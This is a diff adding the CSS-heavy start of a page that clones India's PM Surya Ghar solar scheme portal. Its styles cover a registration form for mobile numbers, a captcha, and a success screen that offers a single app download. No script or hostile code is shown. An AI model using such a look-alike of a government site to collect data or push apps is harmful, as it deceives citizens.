@@ -1,0 +1,2628 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PM Surya Ghar: Muft Bijli Yojana | MNRE</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Devanagari:wght@400;600;700;800&family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <style>
+/* PM Surya Ghar � informational UI clone (public content only) */
+:root {
+  --navy: #004a87;
+  --navy-deep: #003b6e;
+  --blue-accent: #1d5a96;
+  --blue-bright: #0066cc;
+  --text: #1a1a1a;
+  --text-muted: #555;
+  --bg-page: #f5f7fa;
+  --card-blue: #e8f2fc;
+  --card-blue-soft: #e3f2fd;
+  --white: #fff;
+  --border-light: #e0e4e8;
+  --shadow: 0 2px 12px rgba(0, 74, 135, 0.08);
+  --radius: 14px;
+  --radius-lg: 18px;
+  --header-h: auto;
+  --font: "Noto Sans Devanagari", "Open Sans", system-ui, -apple-system, sans-serif;
+}
+
+*,
+*::before,
+*::after {
+  box-sizing: border-box;
+}
+
+html {
+  scroll-behavior: smooth;
+}
+
+body {
+  margin: 0;
+  font-family: var(--font);
+  color: var(--text);
+  background: var(--white);
+  line-height: 1.5;
+  padding-bottom: 2rem;
+}
+
+a {
+  color: var(--blue-bright);
+}
+
+img {
+  max-width: 100%;
+  height: auto;
+  display: block;
+}
+
+/* ��� Top bar ��� */
+.gov-bar {
+  background: var(--navy);
+  color: var(--white);
+  padding: 0.4rem 1rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+}
+
+.gov-bar .flag {
+  width: 22px;
+  height: 14px;
+  border-radius: 2px;
+  flex-shrink: 0;
+  box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.25);
+}
+
+/* ��� Site header ��� */
+.site-header {
+  background: var(--white);
+  padding: 0.65rem 1rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 0.75rem;
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+
+.site-header__brand {
+  display: flex;
+  align-items: center;
+  gap: 0.65rem;
+  min-width: 0;
+}
+
+.site-header__emblem {
+  width: 100px;
+  height: auto;
+  flex-shrink: 0;
+}
+
+.site-header__titles {
+  min-width: 0;
+}
+
+.site-header__titles .hi {
+  font-size: 0.8rem;
+  font-weight: 700;
+  color: var(--navy);
+  line-height: 1.2;
+}
+
+.site-header__titles .en {
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--navy);
+  line-height: 1.25;
+  margin-top: 2px;
+}
+
+.menu-toggle {
+  background: none;
+  border: none;
+  padding: 0.5rem;
+  cursor: pointer;
+  color: var(--navy);
+  font-size: 1.35rem;
+  line-height: 1;
+}
+
+/* ��� Mobile nav drawer ��� */
+.nav-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.35);
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity 0.2s, visibility 0.2s;
+  z-index: 200;
+}
+
+.nav-overlay.is-open {
+  opacity: 1;
+  visibility: visible;
+}
+
+.mobile-nav {
+  position: fixed;
+  top: 0;
+  right: 0;
+  width: min(300px, 88vw);
+  height: 100%;
+  background: var(--white);
+  z-index: 201;
+  transform: translateX(100%);
+  transition: transform 0.25s ease;
+  padding: 1.25rem;
+  box-shadow: -4px 0 24px rgba(0, 0, 0, 0.12);
+}
+
+.mobile-nav.is-open {
+  transform: translateX(0);
+}
+
+.mobile-nav h3 {
+  margin: 0 0 1rem;
+  font-size: 0.9rem;
+  color: var(--navy);
+}
+
+.mobile-nav a {
+  display: block;
+  padding: 0.65rem 0;
+  color: var(--text);
+  text-decoration: none;
+  font-weight: 600;
+  font-size: 0.9rem;
+  border-bottom: 1px solid var(--border-light);
+  cursor: pointer;
+}
+
+.mobile-nav a:hover {
+  color: var(--blue-accent);
+}
+
+.mobile-nav__close {
+  position: absolute;
+  top: 1rem;
+  right: 1rem;
+  background: none;
+  border: none;
+  font-size: 1.5rem;
+  cursor: pointer;
+  color: var(--navy);
+  line-height: 1;
+}
+
+/* ��� Main container ��� */
+.page-wrap {
+  max-width: 520px;
+  margin: 0 auto;
+  padding: 0 1rem 0.5rem;
+}
+
+.page-wrap--wide {
+  max-width: 560px;
+}
+
+/* ��� Home hero ��� */
+.hero-title {
+  text-align: center;
+  padding: 1.5rem 0 1rem;
+}
+
+.hero-title .line1 {
+  font-size: 1.35rem;
+  font-weight: 800;
+  color: var(--text);
+}
+
+.hero-title .line2 {
+  font-size: 1.65rem;
+  font-weight: 800;
+  color: var(--navy);
+  margin-top: 0.25rem;
+}
+
+.hero-photo-wrap {
+  max-width: 280px;
+  margin: 0 auto 1.25rem;
+  border-radius: 0 0 var(--radius-lg) var(--radius-lg);
+  overflow: hidden;
+}
+
+.hero-quote {
+  font-weight: 700;
+  font-size: 0.95rem;
+  text-align: left;
+  color: var(--text);
+  margin-bottom: 1rem;
+  line-height: 1.55;
+}
+
+.hero-attrib {
+  text-align: right;
+  margin-bottom: 1.75rem;
+}
+
+.hero-attrib .name {
+  font-weight: 700;
+  color: var(--blue-accent);
+  font-size: 1rem;
+}
+
+.hero-attrib .role {
+  font-size: 0.85rem;
+  color: #4a7eb5;
+  margin-top: 0.15rem;
+}
+
+.bottom-accent-bar {
+  height: 10px;
+  background: linear-gradient(90deg, #b8d9f5, #7eb8e8);
+  margin: 0 -1rem;
+  max-width: none;
+}
+
+/* ��� Announcement ��� */
+.section-announcement {
+  margin-top: 0.5rem;
+  margin-bottom: 0.5rem;
+}
+
+.section-head {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  margin-bottom: 0.75rem;
+}
+
+.section-head .icon {
+  font-size: 1.25rem;
+}
+
+.section-head h2 {
+  margin: 0;
+  font-size: 1.15rem;
+  font-weight: 800;
+}
+
+.announce-box {
+  background: var(--card-blue-soft);
+  border-radius: var(--radius);
+  padding: 1rem 1rem 2.75rem;
+  position: relative;
+  border: 1px solid rgba(0, 74, 135, 0.12);
+}
+
+.announce-box p {
+  margin: 0;
+  font-size: 0.875rem;
+  color: var(--text);
+  line-height: 1.55;
+}
+
+.announce-link {
+  display: block;
+  text-decoration: none;
+  cursor: pointer;
+  transition: opacity 0.2s;
+}
+
+.announce-link:hover {
+  opacity: 0.8;
+}
+
+.announce-link p {
+  margin: 0;
+  font-size: 0.875rem;
+  color: var(--text);
+  line-height: 1.55;
+}
+
+.announce-controls {
+  position: absolute;
+  bottom: 0.65rem;
+  right: 0.75rem;
+  display: flex;
+  gap: 0.35rem;
+}
+
+.announce-controls button {
+  background: none;
+  border: none;
+  color: var(--navy);
+  padding: 0.35rem;
+  cursor: pointer;
+  font-size: 1rem;
+}
+
+/* ��� Minister cards ��� */
+.ministers {
+  margin-top: 0.5rem;
+  margin-bottom: 0.5rem;
+}
+
+.minister-card {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  background: var(--white);
+  border-radius: var(--radius);
+  padding: 1rem;
+  margin-bottom: 0.5rem;
+  box-shadow: var(--shadow);
+  border: 1px solid var(--border-light);
+}
+
+.minister-card__photo {
+  width: 80px;
+  height: 100px;
+  border-radius: 8px;
+  overflow: hidden;
+  flex-shrink: 0;
+  background: var(--bg-page);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.minister-card__photo img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  display: block;
+}
+
+.minister-card__photo--2 {
+  background: var(--bg-page);
+}
+
+.minister-card h3 {
+  margin: 0;
+  font-size: 0.95rem;
+  font-weight: 700;
+}
+
+.minister-card p {
+  margin: 0.25rem 0 0;
+  font-size: 0.8rem;
+  color: var(--text-muted);
+}
+
+/* ��� What's new heading on home ��� */
+.whatsnew-preview {
+  margin-top: 0.5rem;
+  margin-bottom: 0.5rem;
+  text-align: center;
+}
+
+.whatsnew-preview h2 {
+  font-size: 1.5rem;
+  margin: 0;
+}
+
+.whatsnew-preview h2 .w {
+  color: var(--text);
+}
+
+.whatsnew-preview h2 .n {
+  color: var(--blue-bright);
+}
+
+.whatsnew-preview .more {
+  display: inline-block;
+  margin-top: 0.75rem;
+  font-weight: 600;
+  cursor: pointer;
+  text-decoration: none;
+}
+
+/* ��� Benefits page ��� */
+.view-more-link {
+  text-align: center;
+  padding: 0.75rem 0;
+}
+
+.view-more-link a {
+  font-weight: 600;
+  cursor: pointer;
+}
+
+#benefits,
+#registration {
+  scroll-margin-top: 88px;
+}
+
+.home-benefits {
+  margin-top: 0.25rem;
+}
+
+.home-registration {
+  margin-top: 0.5rem;
+}
+
+.reg-official-note {
+  text-align: center;
+  font-size: 0.85rem;
+  color: #666;
+  margin: 1.25rem 0 0.5rem;
+}
+
+/* ��� Legal / Terms ��� */
+.legal-page {
+  padding-top: 0.5rem;
+}
+
+.legal-back {
+  margin: 0 0 1rem;
+}
+
+.legal-back a {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+  font-size: 0.9rem;
+  font-weight: 600;
+  color: var(--navy);
+  text-decoration: none;
+  cursor: pointer;
+}
+
+.legal-back a:hover {
+  text-decoration: underline;
+}
+
+.legal-card {
+  background: var(--white);
+  border-radius: var(--radius-lg);
+  padding: 1.35rem 1.15rem 1.5rem;
+  box-shadow: var(--shadow);
+  border: 1px solid var(--border-light);
+}
+
+.legal-card h1 {
+  margin: 0 0 1.15rem;
+  font-size: 1.35rem;
+  color: var(--navy);
+  text-align: center;
+}
+
+.legal-card p {
+  margin: 0 0 1rem;
+  font-size: 0.875rem;
+  line-height: 1.65;
+  color: var(--text);
+  text-align: justify;
+}
+
+.legal-card p:last-child {
+  margin-bottom: 0;
+}
+
+.legal-card h2 {
+  font-size: 1.02rem;
+  color: var(--navy);
+  margin: 1.35rem 0 0.5rem;
+  line-height: 1.35;
+  text-align: left;
+}
+
+.legal-card h2:first-of-type {
+  margin-top: 0.75rem;
+}
+
+.legal-card .legal-list {
+  margin: 0 0 1rem;
+  padding-left: 1.25rem;
+  font-size: 0.875rem;
+  line-height: 1.65;
+  color: var(--text);
+  text-align: justify;
+}
+
+.legal-card .legal-list li {
+  margin-bottom: 0.55rem;
+}
+
+.legal-card .legal-list li:last-child {
+  margin-bottom: 0;
+}
+
+.legal-card--long p + h2 {
+  margin-top: 1.35rem;
+}
+
+.legal-card a {
+  color: var(--blue-bright);
+  font-weight: 600;
+  cursor: pointer;
+}
+
+.card-white {
+  background: var(--white);
+  border-radius: var(--radius-lg);
+  padding: 1.35rem 1.1rem;
+  box-shadow: var(--shadow);
+  border: 1px solid var(--border-light);
+  margin: 1rem 0;
+}
+
+.card-white h1 {
+  text-align: center;
+  color: var(--navy);
+  font-size: 1.65rem;
+  margin: 0 0 1.25rem;
+}
+
+.subsidy-block {
+  text-align: center;
+  padding: 0.5rem 0;
+}
+
+.subsidy-block h3 {
+  margin: 0 0 1rem;
+  font-size: 1rem;
+  font-weight: 700;
+}
+
+.subsidy-block h3 span {
+  color: var(--blue-accent);
+}
+
+.subsidy-block .amt {
+  font-size: 1.35rem;
+  font-weight: 800;
+  color: var(--navy);
+}
+
+.subsidy-block .per {
+  font-size: 0.95rem;
+  margin: 0.25rem 0;
+}
+
+.subsidy-block .small {
+  font-size: 0.8rem;
+  color: var(--text-muted);
+  max-width: 320px;
+  margin: 0 auto;
+}
+
+.subsidy-block hr {
+  border: none;
+  border-top: 1px solid var(--border-light);
+  margin: 1.15rem 0;
+}
+
+.note-10 {
+  text-align: center;
+  font-size: 0.9rem;
+  margin-bottom: 0.5rem;
+}
+
+/* ��� Table card ��� */
+.capacity-card {
+  background: var(--white);
+  border-radius: var(--radius-lg);
+  padding: 1.25rem;
+  margin: 1rem 0;
+  box-shadow: var(--shadow);
+  border: 1px solid var(--border-light);
+}
+
+.capacity-card .note {
+  text-align: center;
+  font-size: 0.85rem;
+  margin-bottom: 0.75rem;
+}
+
+.capacity-card h2 {
+  text-align: center;
+  font-size: 1.05rem;
+  margin: 0 0 1rem;
+}
+
+.capacity-table {
+  width: 100%;
+  border: 1px solid var(--border-light);
+  border-radius: 10px;
+  overflow: hidden;
+  border-collapse: collapse;
+  font-size: 0.8rem;
+}
+
+.capacity-table th,
+.capacity-table td {
+  padding: 0.65rem 0.5rem;
+  text-align: center;
+  border: 1px solid var(--border-light);
+}
+
+.capacity-table th {
+  background: #f8fafc;
+  color: var(--text-muted);
+  font-weight: 600;
+  font-size: 0.72rem;
+  line-height: 1.3;
+}
+
+/* ��� Registration section title ��� */
+.reg-section-title {
+  text-align: center;
+  margin: 1.5rem 0 1rem;
+}
+
+.reg-section-title h2 {
+  margin: 0;
+  font-size: 1.4rem;
+}
+
+.reg-section-title .c {
+  color: var(--navy);
+}
+
+.reg-section-title .r {
+  color: var(--text);
+}
+
+/* ��� Process steps (winding path) ��� */
+.process-wrap {
+  position: relative;
+  padding: 0.5rem 0 2rem;
+}
+
+.process-path {
+  position: absolute;
+  left: 12px;
+  top: 0;
+  bottom: 0;
+  width: 4px;
+  background: linear-gradient(
+    180deg,
+    var(--navy) 0%,
+    var(--navy) 100%
+  );
+  border-radius: 4px;
+  opacity: 0.35;
+  display: none;
+}
+
+@media (min-width: 400px) {
+  .process-path {
+    display: block;
+  }
+}
+
+.step-card {
+  position: relative;
+  margin-bottom: 1.25rem;
+  border: 3px solid var(--navy);
+  border-radius: var(--radius-lg);
+  padding: 1.1rem 1rem 1.25rem;
+  background: var(--white);
+  transition: transform 0.2s, box-shadow 0.2s;
+}
+
+.step-card:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 4px 16px rgba(0, 74, 135, 0.15);
+}
+
+.step-card--fill {
+  background: var(--card-blue);
+}
+
+.step-card__illu {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 0.85rem;
+  min-height: 100px;
+  align-items: center;
+}
+
+.step-card__illu svg {
+  max-width: 220px;
+  height: auto;
+}
+
+.step-card__illu i {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.step-card h3 {
+  margin: 0 0 0.65rem;
+  text-align: center;
+  color: var(--blue-accent);
+  font-size: 1.1rem;
+}
+
+.step-card p {
+  margin: 0;
+  text-align: center;
+  font-size: 0.875rem;
+  color: var(--text-muted);
+  line-height: 1.55;
+}
+
+.step-card a.official {
+  word-break: break-all;
+}
+
+/* Step 06 special: illustration offset */
+.step-card--solar .step-card__illu {
+  flex-wrap: wrap;
+  gap: 0.5rem;
+}
+
+/* ��� What's New list ��� */
+.whatsnew-page h1 {
+  text-align: center;
+  font-size: 1.5rem;
+  margin: 1.25rem 0 1rem;
+}
+
+.whatsnew-toolbar {
+  display: flex;
+  flex-direction: column;
+  gap: 0.65rem;
+  margin-bottom: 1.25rem;
+}
+
+.whatsnew-search-label {
+  margin: 0;
+  font-size: 0.95rem;
+  font-weight: 700;
+  color: var(--navy);
+}
+
+.whatsnew-search,
+.whatsnew-filter {
+  width: 100%;
+  padding: 0.65rem 0.85rem;
+  border: 1px solid var(--border-light);
+  border-radius: 10px;
+  font-size: 0.9rem;
+  font-family: inherit;
+  background: var(--white);
+}
+
+.whatsnew-search:focus,
+.whatsnew-filter:focus {
+  outline: 2px solid rgba(0, 74, 135, 0.25);
+  border-color: var(--navy);
+}
+
+.whatsnew-empty {
+  text-align: center;
+  padding: 1.75rem 1rem;
+  color: var(--text-muted);
+  font-size: 0.9rem;
+}
+
+.visually-hidden {
+  position: absolute;
+  width: 1px;
+  height: 1px;
+  padding: 0;
+  margin: -1px;
+  overflow: hidden;
+  clip: rect(0, 0, 0, 0);
+  white-space: nowrap;
+  border: 0;
+}
+
+.whatsnew-page h1 .w {
+  color: var(--text);
+}
+
+.whatsnew-page h1 .n {
+  color: var(--blue-bright);
+}
+
+.notice-card {
+  display: flex;
+  gap: 0.85rem;
+  background: var(--white);
+  border: 1px solid var(--border-light);
+  border-radius: var(--radius);
+  padding: 1rem;
+  margin-bottom: 0.85rem;
+  box-shadow: 0 1px 6px rgba(0, 0, 0, 0.04);
+}
+
+.notice-card__date {
+  flex-shrink: 0;
+  text-align: center;
+  min-width: 48px;
+}
+
+.notice-card__date .day {
+  font-size: 1.35rem;
+  font-weight: 800;
+  line-height: 1;
+  color: var(--navy);
+}
+
+.notice-card__date .mon {
+  font-size: 0.75rem;
+  color: var(--text-muted);
+  text-transform: capitalize;
+}
+
+.notice-card__yr {
+  font-size: 0.62rem;
+  color: #888;
+  margin-top: 2px;
+  line-height: 1;
+}
+
+.notice-card__divider {
+  width: 1px;
+  background: var(--border-light);
+  flex-shrink: 0;
+}
+
+.notice-card__body {
+  min-width: 0;
+}
+
+.notice-tag {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.35rem;
+  font-size: 0.7rem;
+  font-weight: 600;
+  padding: 0.2rem 0.5rem;
+  border-radius: 6px;
+  margin-bottom: 0.5rem;
+}
+
+.notice-tag--general {
+  color: var(--blue-accent);
+  background: #e8f4ff;
+  border: 1px solid #b8d4f0;
+}
+
+.notice-tag--scheme {
+  color: var(--text);
+  background: #f0f2f5;
+  border: 1px solid #dde1e6;
+}
+
+.notice-tag--technical {
+  color: #6a1b9a;
+  background: #f3e5f5;
+  border: 1px solid #ce93d8;
+}
+
+.notice-tag--capacity {
+  color: #1565c0;
+  background: #e3f2fd;
+  border: 1px solid #90caf9;
+}
+
+.notice-tag--meeting {
+  color: #e65100;
+  background: #fff3e0;
+  border: 1px solid #ffcc80;
+}
+
+.notice-tag--workshop {
+  color: #00695c;
+  background: #e0f2f1;
+  border: 1px solid #80cbc4;
+}
+
+.notice-tag--cfa {
+  color: #c62828;
+  background: #ffebee;
+  border: 1px solid #ef9a9a;
+}
+
+.notice-tag--subsidy {
+  color: #2e7d32;
+  background: #e8f5e9;
+  border: 1px solid #a5d6a7;
+}
+
+.notice-card__body h4 {
+  margin: 0 0 0.5rem;
+  font-size: 0.88rem;
+  line-height: 1.35;
+  font-weight: 700;
+}
+
+.notice-card__body p {
+  margin: 0;
+  font-size: 0.8rem;
+  color: var(--text-muted);
+  line-height: 1.45;
+}
+
+.notice-card__link {
+  display: inline-block;
+  margin-top: 0.15rem;
+  font-size: 0.82rem;
+  font-weight: 700;
+  color: var(--blue-bright);
+  text-decoration: none;
+  cursor: pointer;
+}
+
+.notice-card__link:hover {
+  text-decoration: underline;
+}
+
+/* ��� Footer ��� */
+.site-footer {
+  background: var(--navy-deep);
+  color: var(--white);
+  padding: 1.75rem 1.25rem 2rem;
+  margin-top: 0.5rem;
+}
+
+.site-footer__brand {
+  display: flex;
+  align-items: center;
+  gap: 0.65rem;
+  margin-bottom: 1.5rem;
+}
+
+.site-footer__brand img {
+  width: 95px;
+  filter: brightness(0) invert(1);
+}
+
+.site-footer__brand .hi,
+.site-footer__brand .en {
+  font-size: 0.65rem;
+  font-weight: 700;
+  line-height: 1.25;
+  opacity: 0.95;
+}
+
+.footer-links {
+  list-style: none;
+  margin: 0;
+  padding: 0;
+}
+
+.footer-links li {
+  margin-bottom: 0.65rem;
+}
+
+.footer-links a {
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+  color: var(--white);
+  text-decoration: none;
+  font-size: 0.85rem;
+  opacity: 0.95;
+  cursor: pointer;
+}
+
+.footer-links a i {
+  width: 1.25rem;
+  text-align: center;
+  opacity: 0.85;
+}
+
+.footer-links a:hover {
+  text-decoration: underline;
+}
+
+.footer-contact {
+  margin: 1.5rem 0 1.25rem;
+}
+
+.footer-contact a {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  color: var(--white);
+  text-decoration: none;
+  border: 1px solid rgba(255, 255, 255, 0.6);
+  border-radius: 999px;
+  padding: 0.65rem 1.15rem;
+  font-size: 0.85rem;
+  font-weight: 600;
+  cursor: pointer;
+}
+
+.footer-stores {
+  display: flex;
+  gap: 0.65rem;
+  flex-wrap: wrap;
+  margin-bottom: 1.5rem;
+}
+
+.store-btn {
+  flex: 1;
+  min-width: 140px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.4rem;
+  padding: 0.55rem 0.75rem;
+  border-radius: 10px;
+  text-decoration: none;
+  font-size: 0.65rem;
+  font-weight: 600;
+  line-height: 1.2;
+}
+
+.store-btn--apple {
+  background: var(--white);
+  color: #000;
+}
+
+.store-btn--play {
+  background: #111;
+  color: var(--white);
+  border: 1px solid #333;
+}
+
+.store-btn i {
+  font-size: 1.35rem;
+}
+
+.footer-copy {
+  text-align: center;
+  font-size: 0.75rem;
+  opacity: 0.85;
+  line-height: 1.5;
+}
+
+.footer-copy p {
+  margin: 0.35rem 0;
+}
+
+/* ��� FAB ��� */
+.fab-top {
+  position: fixed;
+  bottom: 1.25rem;
+  right: 1rem;
+  width: 46px;
+  height: 46px;
+  border-radius: 50%;
+  background: var(--navy);
+  color: var(--white);
+  border: none;
+  box-shadow: 0 4px 14px rgba(0, 59, 110, 0.35);
+  cursor: pointer;
+  z-index: 90;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.1rem;
+  opacity: 0;
+  visibility: hidden;
+  transition: opacity 0.2s, visibility 0.2s;
+}
+
+.fab-top.is-visible {
+  opacity: 1;
+  visibility: visible;
+}
+
+.fab-top:hover {
+  background: var(--blue-accent);
+}
+
+/* ��� Plug connector graphic (registration intro) ��� */
+.reg-connector {
+  display: flex;
+  align-items: flex-end;
+  gap: 0.5rem;
+  margin: 1rem 0 0.5rem;
+  padding-left: 0.25rem;
+}
+
+.reg-connector .plug-icon {
+  font-size: 2rem;
+  color: #2e7d32;
+}
+
+.reg-connector .line {
+  flex: 1;
+  height: 4px;
+  background: var(--navy);
+  border-radius: 2px;
+  margin-bottom: 0.5rem;
+}
+
+/* Registration Form Styles */
+.reg-form-section {
+  background: var(--white);
+  padding: 1.5rem;
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow);
+  margin-top: 1.5rem;
+  margin-bottom: 2rem;
+}
+
+.reg-form-header {
+  text-align: center;
+  margin-bottom: 2rem;
+}
+
+.reg-form-header h1 {
+  font-size: 1.5rem;
+  font-weight: 800;
+  color: var(--navy);
+  margin: 0 0 0.5rem;
+}
+
+.reg-form-header .subtext {
+  font-size: 0.9rem;
+  color: var(--text-muted);
+  margin: 0;
+}
+
+/* Form Styles */
+.registration-form {
+  display: flex;
+  flex-direction: column;
+  gap: 1.5rem;
+}
+
+.form-group {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+}
+
+.form-group label {
+  font-weight: 600;
+  font-size: 0.9rem;
+  color: var(--navy);
+}
+
+.form-group input[type="text"],
+.form-group input[type="tel"],
+.form-group input[type="email"] {
+  padding: 0.75rem 0.875rem;
+  border: 1px solid var(--border-light);
+  border-radius: var(--radius);
+  font-size: 0.95rem;
+  font-family: var(--font);
+  background: var(--white);
+  color: var(--text);
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+.form-group input[type="text"]:focus,
+.form-group input[type="tel"]:focus,
+.form-group input[type="email"]:focus {
+  outline: none;
+  border-color: var(--blue-bright);
+  box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
+}
+
+.form-group input::placeholder {
+  color: #aaa;
+}
+
+/* Mobile Input */
+.mobile-input-wrapper {
+  display: flex;
+  align-items: center;
+  border: 1px solid var(--border-light);
+  border-radius: var(--radius);
+  overflow: hidden;
+  background: var(--white);
+}
+
+.mobile-input-wrapper .country-code {
+  padding: 0.75rem 0.875rem;
+  background: var(--card-blue-soft);
+  color: var(--navy);
+  font-weight: 600;
+  border-right: 1px solid var(--border-light);
+  font-size: 0.95rem;
+  white-space: nowrap;
+}
+
+.mobile-input-wrapper input[type="tel"] {
+  flex: 1;
+  border: none;
+  padding: 0.75rem 0.875rem;
+  font-size: 0.95rem;
+}
+
+.mobile-input-wrapper input[type="tel"]:focus {
+  outline: none;
+  background: rgba(0, 102, 204, 0.02);
+}
+
+/* Helper Text */
+.helper-text {
+  font-size: 0.8rem;
+  color: var(--text-muted);
+  margin-top: 0.25rem;
+}
+
+/* Captcha Container */
+.captcha-container {
+  display: flex;
+  flex-direction: column;
+  gap: 0.75rem;
+}
+
+.captcha-box {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+  padding: 1rem;
+  background: var(--card-blue-soft);
+  border-radius: var(--radius);
+  border: 1px solid rgba(0, 74, 135, 0.15);
+}
+
+.captcha-image {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 80px;
+  background: var(--white);
+  border-radius: 4px;
+  border: 1px solid var(--border-light);
+}
+
+.captcha-image canvas {
+  max-width: 100%;
+  height: auto;
+}
+
+.captcha-refresh-btn {
+  padding: 0.5rem 0.75rem;
+  background: var(--blue-bright);
+  color: var(--white);
+  border: none;
+  border-radius: 4px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.4rem;
+  transition: background 0.2s;
+}
+
+.captcha-refresh-btn:hover {
+  background: #0052a3;
+}
+
+.captcha-refresh-btn i {
+  font-size: 0.75rem;
+}
+
+.captcha-container input[type="text"] {
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  font-weight: 600;
+  text-align: center;
+}
+
+/* Checkbox Group */
+.checkbox-group {
+  gap: 0;
+}
+
+.checkbox-label {
+  display: flex;
+  align-items: flex-start;
+  gap: 0.75rem;
+  cursor: pointer;
+  font-size: 0.9rem;
+  color: var(--text);
+  font-weight: 400;
+}
+
+.checkbox-label input[type="checkbox"] {
+  margin-top: 0.35rem;
+  cursor: pointer;
+  width: 18px;
+  height: 18px;
+  accent-color: var(--blue-bright);
+  flex-shrink: 0;
+}
+
+.checkbox-label span {
+  line-height: 1.4;
+}
+
+/* Verify Button */
+.btn-verify {
+  padding: 0.875rem 1.5rem;
+  background: linear-gradient(135deg, var(--blue-bright) 0%, var(--blue-accent) 100%);
+  color: var(--white);
+  border: none;
+  border-radius: var(--radius);
+  font-size: 0.95rem;
+  font-weight: 700;
+  cursor: pointer;
+  transition: transform 0.15s, box-shadow 0.15s;
+  box-shadow: 0 4px 12px rgba(0, 102, 204, 0.25);
+}
+
+.btn-verify:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 16px rgba(0, 102, 204, 0.35);
+}
+
+.btn-verify:active {
+  transform: translateY(0);
+}
+
+/* Form Footer */
+.form-footer {
+  text-align: center;
+  font-size: 0.8rem;
+  color: var(--text-muted);
+  margin: 0.5rem 0 0;
+}
+
+.form-footer a {
+  color: var(--blue-bright);
+  text-decoration: none;
+  cursor: pointer;
+}
+
+.form-footer a:hover {
+  text-decoration: underline;
+}
+
+/* Hidden utility */
+.hidden {
+  display: none !important;
+}
+
+/* Success Screen Styles */
+.success-screen {
+  background: var(--white);
+  padding: 1.5rem;
+  border-radius: var(--radius-lg);
+  box-shadow: var(--shadow);
+  margin-top: 1.5rem;
+  margin-bottom: 2rem;
+  animation: slideUp 0.5s ease;
+}
+
+@keyframes slideUp {
+  from {
+    opacity: 0;
+    transform: translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.success-content {
+  text-align: center;
+}
+
+.success-icon {
+  font-size: 3.5rem;
+  color: #4caf50;
+  margin-bottom: 1rem;
+  animation: scaleIn 0.5s ease 0.2s both;
+}
+
+@keyframes scaleIn {
+  from {
+    transform: scale(0.8);
+    opacity: 0;
+  }
+  to {
+    transform: scale(1);
+    opacity: 1;
+  }
+}
+
+.success-screen h2 {
+  font-size: 1.5rem;
+  font-weight: 800;
+  color: var(--navy);
+  margin: 0 0 1rem;
+}
+
+.success-mobile {
+  font-size: 0.9rem;
+  color: var(--text-muted);
+  margin: 0 0 0.5rem;
+}
+
+.success-mobile strong {
+  color: var(--navy);
+  font-weight: 600;
+}
+
+.success-message {
+  font-size: 0.95rem;
+  color: var(--text);
+  margin: 0 0 1.5rem;
+}
+
+/* Download Section */
+.download-section {
+  background: linear-gradient(135deg, var(--card-blue-soft) 0%, rgba(0, 102, 204, 0.05) 100%);
+  padding: 1.5rem;
+  border-radius: var(--radius);
+  margin: 1.5rem 0;
+  border: 1px solid rgba(0, 74, 135, 0.15);
+}
+
+.download-section h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  color: var(--navy);
+  margin: 0 0 0.5rem;
+}
+
+.download-section > p {
+  font-size: 0.9rem;
+  color: var(--text-muted);
+  margin: 0 0 1.25rem;
+}
+
+/* App Download Buttons */
+.app-buttons {
+  display: flex;
+  flex-direction: column;
+  gap: 0.75rem;
+  margin: 1.25rem 0;
+}
+
+.btn-app {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 1rem 0.75rem;
+  border-radius: var(--radius);
+  text-decoration: none;
+  font-size: 0.9rem;
+  font-weight: 600;
+  transition: transform 0.2s, box-shadow 0.2s;
+  border: 2px solid transparent;
+  cursor: pointer;
+}
+
+.btn-app:hover {
+  transform: translateY(-3px);
+}
+
+.btn-app--single {
+  background: linear-gradient(135deg, var(--blue-bright) 0%, #0052a3 100%);
+  color: white;
+}
+
+.btn-app--single:hover {
+  box-shadow: 0 8px 16px rgba(0, 102, 204, 0.4);
+}
+
+.btn-app i {
+  font-size: 1.5rem;
+  margin-bottom: 0.5rem;
+}
+
+/* Next Steps */
+.next-steps {
+  background: var(--bg-page);
+  padding: 1.25rem;
+  border-radius: var(--radius);
+  margin: 1.5rem 0;
+  text-align: left;
+}
+
